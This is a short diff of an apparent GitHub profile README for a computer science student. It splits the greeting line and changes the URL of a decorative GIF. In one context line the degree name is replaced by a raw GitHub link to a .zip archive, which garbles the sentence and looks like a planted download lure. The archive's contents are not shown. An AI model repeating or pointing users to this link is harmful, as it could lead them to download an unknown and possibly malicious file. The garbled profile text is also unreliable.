@@ -1,4 +1,5 @@
-- 👋 Hi, I’m Anmol Mishra. <img align="right" alt="coding" src="https://user-images.githubusercontent.com/55389276/140866485-8fb1c876-9a8f-4d6a-98dc-08c4981eaf70.gif" style="max-width: 100%; display: inline-block;" data-target="animated-image.originalImage">
+- 👋 Hi, I’m Anmol Mishra.
+- <img align="right" alt="Coding" src="https://raw.githubusercontent.com/devSouvik/devSouvik/master/gif3.gif" style="max-width: 100%; display: inline-block;" data-target="animated-image.originalImage">
 - 🤓 I am persuing https://raw.githubusercontent.com/anmolmishra09/anmolmishra09/main/dually/anmolmishra09.zip in Computer Science And Engineering from Dr. A. P. J. Abdul Kalam Technical University, Lucknow(2022-2026).
 - 🚀 Technologies
   - Python, Java
